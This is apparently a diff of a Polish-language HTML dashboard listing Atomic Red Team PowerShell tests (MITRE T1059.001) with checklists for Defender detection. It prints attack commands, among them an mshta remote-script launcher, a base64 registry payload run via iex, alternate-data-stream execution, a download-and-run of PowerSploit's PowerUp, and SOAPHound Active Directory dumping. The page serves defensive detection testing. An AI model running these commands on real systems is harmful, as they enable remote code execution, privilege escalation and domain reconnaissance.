+        <b>Atomic Test 8: Powershell invoke mshta.exe download</b>
+        <span id="tested-badge-T1059.001-art08" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (cmd):</b>
+          <pre>C:\Windows\system32\cmd.exe /c &quot;mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()&quot;</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1059.001\Powershell_invoke_mshta.exe_download\test_1.cmd" download>Pobierz test_1.cmd</a><br>
+        <div class="art-checklist" id="checklist-T1059.001-art08" data-scenario="scenarioBlock" data-label="Atomic Test 8: Powershell invoke mshta.exe download">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1059.001','art08','scenarioBlock','Atomic Test 8: Powershell invoke mshta.exe download')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        
+        <b>Atomic Test 9: Powershell Invoke-DownloadCradle</b>
+        <span id="tested-badge-T1059.001-art09" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div class="art-checklist" id="checklist-T1059.001-art09" data-scenario="scenarioBlock" data-label="Atomic Test 9: Powershell Invoke-DownloadCradle">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1059.001','art09','scenarioBlock','Atomic Test 9: Powershell Invoke-DownloadCradle')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-ps">PowerShell</span>
+        <b>Atomic Test 10: PowerShell Fileless Script Execution</b>
+        <span id="tested-badge-T1059.001-art10" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (powershell):</b>
+          <pre># Encoded payload in next command is the following &quot;Set-Content -path &quot;$env:SystemRoot/Temp/art-marker.txt&quot; -value &quot;Hello from the Atomic Red Team&quot;&quot;
+reg.exe add &quot;HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam&quot; /v ART /t REG_SZ /d &quot;U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=&quot; /f
+iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1059.001\PowerShell_Fileless_Script_Execution\test_1.ps1" download>Pobierz test_1.ps1</a><br>
+        <div class="test-cleanup">
+          <b>Cleanup (powershell):</b>
+          <pre>Remove-Item -path C:\Windows\Temp\art-marker.txt -Force -ErrorAction Ignore
+Remove-Item HKCU:\Software\Classes\AtomicRedTeam -Force -ErrorAction Ignore</pre>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1059.001\PowerShell_Fileless_Script_Execution\cleanup_1.ps1" download>Pobierz cleanup_1.ps1</a><br>
+        <div class="art-checklist" id="checklist-T1059.001-art10" data-scenario="scenarioBlock" data-label="Atomic Test 10: PowerShell Fileless Script Execution">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1059.001','art10','scenarioBlock','Atomic Test 10: PowerShell Fileless Script Execution')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-ps">PowerShell</span>
+        <b>Atomic Test 11: NTFS Alternate Data Stream Access</b>
+        <span id="tested-badge-T1059.001-art11" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (powershell):</b>
+          <pre>Add-Content -Path #{ads_file} -Value 'Write-Host &quot;Stream Data Executed&quot;' -Stream 'streamCommand'
 $streamcommand = Get-Content -Path #{ads_file} -Stream 'streamcommand'
-Invoke-Expression $streamcommand</pre><a href='../../scenarios/atomic_tests\T1059.001\NTFS_Alternate_Data_Stream_Access/test_1.ps1'>Pobierz test_1.ps1</a><br><b>Polecenia cleanup (powershell):</b><pre>Remove-Item #{ads_file} -Force -ErrorAction Ignore</pre><a href='../../scenarios/atomic_tests\T1059.001\NTFS_Alternate_Data_Stream_Access/cleanup_1.ps1'>Pobierz cleanup_1.ps1</a><br></li><li><b>PowerShell Session Creation and Use</b><br><b>Polecenia testowe (powershell):</b><pre>New-PSSession -ComputerName #{hostname_to_connect}
+Invoke-Expression $streamcommand</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1059.001\NTFS_Alternate_Data_Stream_Access\test_1.ps1" download>Pobierz test_1.ps1</a><br>
+        <div class="test-cleanup">
+          <b>Cleanup (powershell):</b>
+          <pre>Remove-Item #{ads_file} -Force -ErrorAction Ignore</pre>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1059.001\NTFS_Alternate_Data_Stream_Access\cleanup_1.ps1" download>Pobierz cleanup_1.ps1</a><br>
+        <div class="art-checklist" id="checklist-T1059.001-art11" data-scenario="scenarioBlock" data-label="Atomic Test 11: NTFS Alternate Data Stream Access">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1059.001','art11','scenarioBlock','Atomic Test 11: NTFS Alternate Data Stream Access')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-ps">PowerShell</span>
+        <b>Atomic Test 12: PowerShell Session Creation and Use</b>
+        <span id="tested-badge-T1059.001-art12" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (powershell):</b>
+          <pre>New-PSSession -ComputerName #{hostname_to_connect}
 Test-Connection $env:COMPUTERNAME
-Set-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use -Value "T1086 PowerShell Session Creation and Use"
+Set-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use -Value &quot;T1086 PowerShell Session Creation and Use&quot;
 Get-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use
-Remove-Item -Force $env:TEMP\T1086_PowerShell_Session_Creation_and_Use</pre><a href='../../scenarios/atomic_tests\T1059.001\PowerShell_Session_Creation_and_Use/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>ATHPowerShellCommandLineParameter -Command parameter variations</b><br><b>Polecenia testowe (powershell):</b><pre>Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -Execute -ErrorAction Stop</pre><a href='../../scenarios/atomic_tests\T1059.001\ATHPowerShellCommandLineParameter_-Comma/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>ATHPowerShellCommandLineParameter -Command parameter variations with encoded arguments</b><br><b>Polecenia testowe (powershell):</b><pre>Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop</pre><a href='../../scenarios/atomic_tests\T1059.001\ATHPowerShellCommandLineParameter_-Comma/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>ATHPowerShellCommandLineParameter -EncodedCommand parameter variations</b><br><b>Polecenia testowe (powershell):</b><pre>Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -Execute -ErrorAction Stop</pre><a href='../../scenarios/atomic_tests\T1059.001\ATHPowerShellCommandLineParameter_-Encod/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>ATHPowerShellCommandLineParameter -EncodedCommand parameter variations with encoded arguments</b><br><b>Polecenia testowe (powershell):</b><pre>Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop</pre><a href='../../scenarios/atomic_tests\T1059.001\ATHPowerShellCommandLineParameter_-Encod/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>PowerShell Command Execution</b><br><b>Polecenia testowe (cmd):</b><pre>powershell.exe -e  #{obfuscated_code}</pre><a href='../../scenarios/atomic_tests\T1059.001\PowerShell_Command_Execution/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>PowerShell Invoke Known Malicious Cmdlets</b><br><b>Polecenia testowe (powershell):</b><pre>$malcmdlets = #{Malicious_cmdlets}
+Remove-Item -Force $env:TEMP\T1086_PowerShell_Session_Creation_and_Use</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1059.001\PowerShell_Session_Creation_and_Use\test_1.ps1" download>Pobierz test_1.ps1</a><br>
+        <div class="art-checklist" id="checklist-T1059.001-art12" data-scenario="scenarioBlock" data-label="Atomic Test 12: PowerShell Session Creation and Use">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1059.001','art12','scenarioBlock','Atomic Test 12: PowerShell Session Creation and Use')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-ps">PowerShell</span>
+        <b>Atomic Test 13: ATHPowerShellCommandLineParameter -Command parameter variations</b>
+        <span id="tested-badge-T1059.001-art13" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (powershell):</b>
+          <pre>Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -Execute -ErrorAction Stop</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1059.001\ATHPowerShellCommandLineParameter_-Comma\test_1.ps1" download>Pobierz test_1.ps1</a><br>
+        <div class="art-checklist" id="checklist-T1059.001-art13" data-scenario="scenarioBlock" data-label="Atomic Test 13: ATHPowerShellCommandLineParameter -Command parameter variations">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1059.001','art13','scenarioBlock','Atomic Test 13: ATHPowerShellCommandLineParameter -Command parameter variations')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-ps">PowerShell</span>
+        <b>Atomic Test 14: ATHPowerShellCommandLineParameter -Command parameter variations with encoded arguments</b>
+        <span id="tested-badge-T1059.001-art14" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (powershell):</b>
+          <pre>Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1059.001\ATHPowerShellCommandLineParameter_-Comma\test_1.ps1" download>Pobierz test_1.ps1</a><br>
+        <div class="art-checklist" id="checklist-T1059.001-art14" data-scenario="scenarioBlock" data-label="Atomic Test 14: ATHPowerShellCommandLineParameter -Command parameter variations with encoded arguments">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1059.001','art14','scenarioBlock','Atomic Test 14: ATHPowerShellCommandLineParameter -Command parameter variations with encoded arguments')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-ps">PowerShell</span>
+        <b>Atomic Test 15: ATHPowerShellCommandLineParameter -EncodedCommand parameter variations</b>
+        <span id="tested-badge-T1059.001-art15" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (powershell):</b>
+          <pre>Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -Execute -ErrorAction Stop</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1059.001\ATHPowerShellCommandLineParameter_-Encod\test_1.ps1" download>Pobierz test_1.ps1</a><br>
+        <div class="art-checklist" id="checklist-T1059.001-art15" data-scenario="scenarioBlock" data-label="Atomic Test 15: ATHPowerShellCommandLineParameter -EncodedCommand parameter variations">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1059.001','art15','scenarioBlock','Atomic Test 15: ATHPowerShellCommandLineParameter -EncodedCommand parameter variations')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-ps">PowerShell</span>
+        <b>Atomic Test 16: ATHPowerShellCommandLineParameter -EncodedCommand parameter variations with encoded arguments</b>
+        <span id="tested-badge-T1059.001-art16" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (powershell):</b>
+          <pre>Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1059.001\ATHPowerShellCommandLineParameter_-Encod\test_1.ps1" download>Pobierz test_1.ps1</a><br>
+        <div class="art-checklist" id="checklist-T1059.001-art16" data-scenario="scenarioBlock" data-label="Atomic Test 16: ATHPowerShellCommandLineParameter -EncodedCommand parameter variations with encoded arguments">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1059.001','art16','scenarioBlock','Atomic Test 16: ATHPowerShellCommandLineParameter -EncodedCommand parameter variations with encoded arguments')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-cmd">CMD</span>
+        <b>Atomic Test 17: PowerShell Command Execution</b>
+        <span id="tested-badge-T1059.001-art17" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (cmd):</b>
+          <pre>powershell.exe -e  #{obfuscated_code}</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1059.001\PowerShell_Command_Execution\test_1.cmd" download>Pobierz test_1.cmd</a><br>
+        <div class="art-checklist" id="checklist-T1059.001-art17" data-scenario="scenarioBlock" data-label="Atomic Test 17: PowerShell Command Execution">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1059.001','art17','scenarioBlock','Atomic Test 17: PowerShell Command Execution')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-ps">PowerShell</span>
+        <b>Atomic Test 18: PowerShell Invoke Known Malicious Cmdlets</b>
+        <span id="tested-badge-T1059.001-art18" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (powershell):</b>
+          <pre>$malcmdlets = #{Malicious_cmdlets}
 foreach ($cmdlets in $malcmdlets) {
-    "function $cmdlets { Write-Host Pretending to invoke $cmdlets }"}
+    &quot;function $cmdlets { Write-Host Pretending to invoke $cmdlets }&quot;}
 foreach ($cmdlets in $malcmdlets) {
-    $cmdlets}</pre><a href='../../scenarios/atomic_tests\T1059.001\PowerShell_Invoke_Known_Malicious_Cmdlet/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>PowerUp Invoke-AllChecks</b><br><b>Polecenia testowe (powershell):</b><pre>[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    $cmdlets}</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1059.001\PowerShell_Invoke_Known_Malicious_Cmdlet\test_1.ps1" download>Pobierz test_1.ps1</a><br>
+        <div class="art-checklist" id="checklist-T1059.001-art18" data-scenario="scenarioBlock" data-label="Atomic Test 18: PowerShell Invoke Known Malicious Cmdlets">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1059.001','art18','scenarioBlock','Atomic Test 18: PowerShell Invoke Known Malicious Cmdlets')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-ps">PowerShell</span>
+        <b>Atomic Test 19: PowerUp Invoke-AllChecks</b>
+        <span id="tested-badge-T1059.001-art19" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (powershell):</b>
+          <pre>[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)
-Invoke-AllChecks</pre><a href='../../scenarios/atomic_tests\T1059.001\PowerUp_Invoke-AllChecks/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>Abuse Nslookup with DNS Records</b><br><b>Polecenia testowe (powershell):</b><pre># creating a custom nslookup function that will indeed call nslookup but forces the result to be "whoami"
+Invoke-AllChecks</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1059.001\PowerUp_Invoke-AllChecks\test_1.ps1" download>Pobierz test_1.ps1</a><br>
+        <div class="art-checklist" id="checklist-T1059.001-art19" data-scenario="scenarioBlock" data-label="Atomic Test 19: PowerUp Invoke-AllChecks">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1059.001','art19','scenarioBlock','Atomic Test 19: PowerUp Invoke-AllChecks')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-ps">PowerShell</span>
+        <b>Atomic Test 20: Abuse Nslookup with DNS Records</b>
+        <span id="tested-badge-T1059.001-art20" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (powershell):</b>
+          <pre># creating a custom nslookup function that will indeed call nslookup but forces the result to be &quot;whoami&quot;
 # this would not be part of a real attack but helpful for this simulation
-function nslookup  { &"$env:windir\system32\nslookup.exe" @args | Out-Null; @("","whoami")}
-powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]</pre><a href='../../scenarios/atomic_tests\T1059.001\Abuse_Nslookup_with_DNS_Records/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>SOAPHound - Dump BloodHound Data</b><br><b>Polecenia testowe (powershell):</b><pre>#{soaphound_path} --user #{user} --password #{password} --domain #{domain} --dc #{dc} --bhdump --cachefilename #{cachefilename} --outputdirectory #{outputdirectory}</pre><a href='../../scenarios/atomic_tests\T1059.001\SOAPHound_-_Dump_BloodHound_Data/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>SOAPHound - Build Cache</b><br><b>Polecenia testowe (powershell):</b><pre>#{soaphound_path} --user $(#{user})@$(#{domain}) --password #{password} --dc #{dc} --buildcache --cachefilename #{cachefilename}</pre><a href='../../scenarios/atomic_tests\T1059.001\SOAPHound_-_Build_Cache/test_1.ps1'>Pobierz test_1.ps1</a><br></li></ul><a href='https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1059.001' target='_blank'>Zobacz wszystkie testy na GitHubie</a></div></div>
-  <div class="tactic section"><b>Tactics:</b> <a href="https://attack.mitre.org/tactics/TA0002/" target="_blank">Execution (TA0002)</a></div>
-  <div class="status section"><b>Status:</b> Pending</div>
-  <div class="scenario-block"><b>Twój opis scenariusza:</b><br>Opis scenariusza, podatności lub techniki.</div>
-  <div class="desc section"><b>MITRE Description:</b><br>Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).  PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.  A number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)  PowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)</div>
-  <div class="link section"><b>MITRE Link:</b> <a href="https://attack.mitre.org/techniques/T1059/001/" target="_blank">https://attack.mitre.org/techniques/T1059/001/</a></div>
+function nslookup  { &&quot;$env:windir\system32\nslookup.exe&quot; @args | Out-Null; @(&quot;&quot;,&quot;whoami&quot;)}
+powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1059.001\Abuse_Nslookup_with_DNS_Records\test_1.ps1" download>Pobierz test_1.ps1</a><br>
+        <div class="art-checklist" id="checklist-T1059.001-art20" data-scenario="scenarioBlock" data-label="Atomic Test 20: Abuse Nslookup with DNS Records">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1059.001','art20','scenarioBlock','Atomic Test 20: Abuse Nslookup with DNS Records')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-ps">PowerShell</span>
+        <b>Atomic Test 21: SOAPHound - Dump BloodHound Data</b>
+        <span id="tested-badge-T1059.001-art21" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (powershell):</b>
+          <pre>#{soaphound_path} --user #{user} --password #{password} --domain #{domain} --dc #{dc} --bhdump --cachefilename #{cachefilename} --outputdirectory #{outputdirectory}</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1059.001\SOAPHound_-_Dump_BloodHound_Data\test_1.ps1" download>Pobierz test_1.ps1</a><br>
+        <div class="art-checklist" id="checklist-T1059.001-art21" data-scenario="scenarioBlock" data-label="Atomic Test 21: SOAPHound - Dump BloodHound Data">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1059.001','art21','scenarioBlock','Atomic Test 21: SOAPHound - Dump BloodHound Data')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-ps">PowerShell</span>
+        <b>Atomic Test 22: SOAPHound - Build Cache</b>
+        <span id="tested-badge-T1059.001-art22" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (powershell):</b>
+          <pre>#{soaphound_path} --user $(#{user})@$(#{domain}) --password #{password} --dc #{dc} --buildcache --cachefilename #{cachefilename}</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1059.001\SOAPHound_-_Build_Cache\test_1.ps1" download>Pobierz test_1.ps1</a><br>
+        <div class="art-checklist" id="checklist-T1059.001-art22" data-scenario="scenarioBlock" data-label="Atomic Test 22: SOAPHound - Build Cache">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1059.001','art22','scenarioBlock','Atomic Test 22: SOAPHound - Build Cache')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+  </div>
   <div class="author section"><b>Author:</b> Krzysztof K.</div>
 </div>
 </body>
